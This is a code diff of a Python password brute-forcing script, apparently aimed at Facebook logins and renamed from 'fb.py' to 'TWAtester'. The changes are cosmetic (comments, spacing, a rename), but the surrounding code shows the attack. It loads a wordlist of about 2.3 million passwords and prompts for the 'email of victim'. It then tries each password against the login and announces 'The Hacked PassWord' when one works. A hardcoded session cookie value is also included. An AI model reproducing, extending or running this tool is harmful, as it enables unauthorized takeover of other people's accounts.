@@ -4,7 +4,7 @@ from bs4 import BeautifulSoup
 import sys
 if sys.version_info[0] != 3:
     print('''\t--------------------\n\t\tYOU WILL NEED PYTHON 3.x\n\t\t After install python in your system write this command -->> python3 
-    fb.py\n\t---------------------''')
+    TWAtester.py\n\t---------------------''')
     sys.exit()
 PASSWORD_FILE = "wordtext.txt"
 MIN_PASSWORD_LENGTH = 6
@@ -14,6 +14,9 @@ HEADERS = {
 }
 PAYLOAD = {}
 COOKIES = {}
+
+#functions below
+
 def create_form():
     form = dict()
     cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
@@ -36,14 +39,21 @@ def trying_to_passWord(email, index, password):
         print('\nWOW! Congrats. The Hacked PassWord is : ', password)
         return True
     return False
+
+#condition 
+
 if __name__ == "__main__":
-    print('\n---------- Welcome To TWA  pass  tester ----------\n\n------Be prepeare to kill your unlimited time------\n\n == HIGH WARNING YOU ARE GOING TO USE ==\n== 23Lak 24Thousand 8Hundred And 60 PASSWORDS.==\n')
+    print('\n---------- Welcome To TWA  pass  tester ----------\n\n------Be prepeare to kill your unlimited time------\n\n     == HIGH WARNING YOU ARE GOING TO USE ==\n== 23Lak 24Thousand 8Hundred And 60 PASSWORDS.==\n')
     if not os.path.isfile(PASSWORD_FILE):
-        print("File of wordlist not found: ", PASSWORD_FILE)
+        print("File of wordlist not found: ",PASSWORD_FILE)
         sys.exit(0)
+        
     password_data = open(PASSWORD_FILE, 'r').read().split("\n")
-    print("\n\tGenerating passwords from : ", PASSWORD_FILE)
+    print("\n\tGenerating passwords from : ",PASSWORD_FILE)
     email = input('\nType username or email of victim (perfectly) : ').strip()
+    
+    #tacking input from user here
+    
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
